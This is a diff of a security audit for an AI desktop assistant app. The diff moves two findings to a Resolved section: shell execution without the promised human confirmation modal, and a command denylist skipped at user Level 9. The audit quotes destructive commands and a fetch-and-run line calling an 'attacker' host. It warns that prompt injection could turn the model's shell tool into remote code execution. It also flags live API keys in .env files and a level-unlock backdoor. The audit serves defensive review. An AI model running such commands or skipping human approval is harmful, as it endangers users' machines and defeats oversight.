@@ -11,27 +11,12 @@ This inventory cross-checks the declared security posture in `Regras de Identida
 
 ## Security Considerations
 
-### CRITICAL — Declared "Zero-Trust modal confirmation" is not implemented for shell execution
-
-- **Policy** (`Regras de Identidade/SEGURANCA.MD:5-9`): every shell call must "stop the thread and open `CommandConfirmationWindow`" and force a physical human click on Approve/Reject. The doc names the tool `windows_console_execution`.
-- **Reality**: the actual tool is named `run_command` (`AIBWindows/Services/NativeTools.cs:281-359`), and it executes directly via `CommandService.ExecuteAsync` (`AIBWindows/Services/CommandService.cs:10-72`), which runs `cmd.exe /c {command}` with **no UI confirmation at all**. The class `CommandConfirmationWindow` exists (`AIBWindows/Views/CommandConfirmationWindow.xaml.cs:1-31`) but is never instantiated anywhere in the codebase (`grep CommandConfirmationWindow` returns only its own definition files).
-- **Risk**: any model hallucination or prompt-injection that emits a `run_command` tool call executes silently. The whole architectural promise of the modal is currently a paper guarantee.
-- **Files**: `AIBWindows/Services/NativeTools.cs:281`, `AIBWindows/Services/CommandService.cs:14-24`, `AIBWindows/Views/CommandConfirmationWindow.xaml.cs:1`.
-- **Fix approach**: wire `RunCommandTool.ExecuteAsync` to call `Dispatcher.Invoke` on a new `CommandConfirmationWindow(command).ShowDialog()` and only invoke `CommandService.ExecuteAsync` when `IsAllowed == true`. Honor `settings.ConfirmDangerousCommands` (already declared at `AIBWindows/Services/SettingsService.cs:36`, currently unused) and the `AlwaysAllow` checkbox already supported by the confirmation window.
-
 ### CRITICAL — Live OpenAI service-account key on disk in two `.env` files
 
 - **Files**: `.env` at repo root and `AIBLinux/.env` (both gitignored, **not** committed — verified with `git ls-files | grep .env` returning empty).
 - **Risk**: the key prefix indicates a service-account credential (`sk-svcacct-...`). Even though they are not in git, they are present in plain text in the working tree on a developer machine. Service-account keys generally have larger blast radius (org-level billing/quota) than personal user keys. Any future accidental `git add -A`, `tar`-up, or screen-share would leak it.
 - **Files**: `.env` (repo root), `AIBLinux/.env`.
 - **Fix approach**: rotate the leaked key in the OpenAI console immediately. Replace inline keys with `.env.example` placeholders. Document the assumption that real keys must come from `%APPDATA%/AIB/credentials/` (already implemented via DPAPI in `CredentialService.cs`) instead of dotenv. Consider migrating Linux load to use `keyring` or DPAPI-equivalent.
-
-### CRITICAL — `RunCommandTool` sandbox is bypassed at user Level 9 entirely
-
-- **Files**: `AIBWindows/Services/NativeTools.cs:320-355`.
-- **Behavior**: the entire denylist (destructive verbs, system directories, network commands) is wrapped in `if (userLevel < 9) { ... }`. At Level 9 (achievable via `MessageCount >= 1500`), the LLM may execute `rm -rf`, `format`, `Invoke-WebRequest http://attacker/payload.ps1 | iex`, anything — straight through `cmd.exe /c`. There is still no confirmation modal (see first finding).
-- **Risk**: a single prompt-injection on a power user (someone who's been using AIB for ≥ 1500 messages) becomes full RCE on their box.
-- **Fix approach**: keep the modal confirmation regardless of level; reserve Level 9 for *removing the denylist*, not for removing the *human-in-the-loop*. Reinstate a per-call rate limit too.
 
 ### CRITICAL — Backdoor command `/unlock_level` lets the chat input self-promote to Level 9
 
@@ -351,6 +336,31 @@ This inventory cross-checks the declared security posture in `Regras de Identida
 - **ReAct streaming FSM** (`OpenAIService.cs:240-502`): no tests for marker splitting, carry buffer, or finish-reason handling.
 - **Tool arg parsing** (`ToolArgParser`): no fuzz tests with malformed JSON.
 - **Risk**: any of the security fixes proposed above can regress without anyone noticing.
+
+## Resolved
+
+### CRITICAL — Declared "Zero-Trust modal confirmation" is not implemented for shell execution
+
+- **Resolved in:** Phase 01 — modal-and-level9 (security-remediation-v1)
+- **Commit:** `6c078c2d497f71ea9011b44ddc21f53499aaf10b`
+- **Resolution:** Modal wired into `RunCommandTool.ExecuteAsync` via `Application.Current.Dispatcher.InvokeAsync`; all levels gate through HITL. AlwaysAllow scoped to process lifetime via new `AlwaysAllowSession`; audit log at `~/.AIB/logs/audit.log` via new `AuditLogService`. Verified by manual UAT scenarios in `.planning/phases/01_modal-and-level9/VERIFICATION.md` (T9).
+- **Date:** 2026-05-29
+- **Original finding:**
+    - **Policy** (`Regras de Identidade/SEGURANCA.MD:5-9`): every shell call must "stop the thread and open `CommandConfirmationWindow`" and force a physical human click on Approve/Reject. The doc names the tool `windows_console_execution`.
+    - **Reality at audit time**: the actual tool is named `run_command` (`AIBWindows/Services/NativeTools.cs:281-359`), and it executed directly via `CommandService.ExecuteAsync` (`AIBWindows/Services/CommandService.cs:10-72`), which runs `cmd.exe /c {command}` with **no UI confirmation at all**. The class `CommandConfirmationWindow` existed (`AIBWindows/Views/CommandConfirmationWindow.xaml.cs:1-31`) but was never instantiated anywhere in the codebase.
+    - **Risk**: any model hallucination or prompt-injection that emits a `run_command` tool call executes silently. The whole architectural promise of the modal was a paper guarantee.
+    - **Files**: `AIBWindows/Services/NativeTools.cs:281`, `AIBWindows/Services/CommandService.cs:14-24`, `AIBWindows/Views/CommandConfirmationWindow.xaml.cs:1`.
+
+### CRITICAL — `RunCommandTool` sandbox is bypassed at user Level 9 entirely
+
+- **Resolved in:** Phase 01 — modal-and-level9 (security-remediation-v1)
+- **Commit:** `6c078c2d497f71ea9011b44ddc21f53499aaf10b`
+- **Resolution:** Modal fires regardless of level. Denylist extracted into private `RunCommandTool.ApplyDenylist`; new call-site gate `if (userLevel < 9 && settings.ConfirmDangerousCommands)` per D5 + D8. L9 disables only the denylist — never the human-in-the-loop modal. Destructive verbs at L9 now reach the modal verbatim for explicit human approval.
+- **Date:** 2026-05-29
+- **Original finding:**
+    - **Files**: `AIBWindows/Services/NativeTools.cs:320-355`.
+    - **Behavior at audit time**: the entire denylist (destructive verbs, system directories, network commands) was wrapped in `if (userLevel < 9) { ... }`. At Level 9 (achievable via `MessageCount >= 1500`), the LLM could execute `rm -rf`, `format`, `Invoke-WebRequest http://attacker/payload.ps1 | iex`, anything — straight through `cmd.exe /c`. There was still no confirmation modal (see first resolved finding).
+    - **Risk**: a single prompt-injection on a power user (someone who's been using AIB for ≥ 1500 messages) became full RCE on their box.
 
 ---
 
